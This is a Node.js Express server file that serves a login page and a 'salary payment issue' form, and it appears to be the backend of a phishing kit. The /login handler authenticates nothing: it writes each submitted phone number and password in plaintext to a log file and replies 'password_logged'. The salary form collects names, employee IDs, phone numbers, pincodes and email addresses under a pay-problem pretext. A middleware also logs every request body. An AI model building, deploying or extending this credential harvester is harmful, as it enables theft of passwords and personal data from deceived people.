const express = require('express');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const logPath = path.join(__dirname, 'backend.log');

const logStream = fs.createWriteStream(logPath, { flags: 'a' });
logStream.on('error', (err) => {
  // If logging fails, print to stderr but keep the server alive if possible.
  console.error('Failed to write to log stream:', err);
});

app.use(helmet());
app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use((req, res, next) => {
  if (req.url.includes('\\')) {
    req.url = req.url.replace(/\\/g, '/');
  }
  next();
});
app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'ejs');
app.use('/static', express.static(path.join(__dirname, 'public', 'static')));
app.get('/', (req, res) => {
  return res.redirect('/login');
});
app.get('/login', (req, res) => {
  return res.render('login');
});
app.get('/salary-issue', (req, res) => {
  return res.render('salary-payment-issue');
});
app.use(
  rateLimit({
    windowMs: 60 * 1000,
    max: 100,
    standardHeaders: true,
    legacyHeaders: false,
  })
);

app.use((req, res, next) => {
  const entry = {
    timestamp: new Date().toISOString(),
    ip: req.ip,
    method: req.method,
    url: req.originalUrl,
    body: req.body || {},
  };

  logStream.write(`${JSON.stringify(entry)}\n`);
  next();
});

function writeLog(entry) {
  const logEntry = {
    timestamp: new Date().toISOString(),
    ...entry,
  };
  logStream.write(`${JSON.stringify(logEntry)}\n`);
}

app.post('/login', (req, res, next) => {
  try {
    const { phone, password } = req.body;

    if (!phone) {
      return res.status(400).json({ error: 'phone is required' });
    }

    if (!password) {
      writeLog({
        event: 'login_phone',
        phone,
      });
    }

    writeLog({
      event: 'login_password',
      phone,
      password,
    });
    return res.json({ status: 'password_logged' });
  } catch (error) {
    next(error);
  }
});

app.post('/salary-payment-issue', (req, res, next) => {
  try {
    const {
      name,
      employeeId,
      phoneNumber,
      pincode,
      state,
      emailAddress,
      issue,
    } = req.body;

    if (!name || !employeeId || !phoneNumber || !pincode || !state || !emailAddress) {
      return res.status(400).json({ error: 'missing required salary payment issue fields' });
    }

    writeLog({
      event: 'salaryPaymentIssue',
      name,
      employeeId,
      phoneNumber,
      pincode,
      state,
      emailAddress,
      issue: issue || null,
    });

    return res.render('salary-payment-issue');
  } catch (error) {
    next(error);
  }
});

app.use((err, req, res, next) => {
  const errorLog = {
    level: 'error',
    timestamp: new Date().toISOString(),
    message: err.message,
    stack: err.stack,
    route: req.originalUrl,
    method: req.method,
  };

  logStream.write(`${JSON.stringify(errorLog)}\n`);

  if (res.headersSent) {
    return next(err);
  }

  res.status(500).json({ error: 'Internal server error' });
});

process.on('uncaughtException', (err) => {
  logStream.write(`${JSON.stringify({ level: 'fatal', timestamp: new Date().toISOString(), message: err.message, stack: err.stack })}\n`);
  process.exit(1);
});

process.on('unhandledRejection', (reason) => {
  logStream.write(`${JSON.stringify({ level: 'fatal', timestamp: new Date().toISOString(), reason: reason && reason.toString() })}\n`);
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
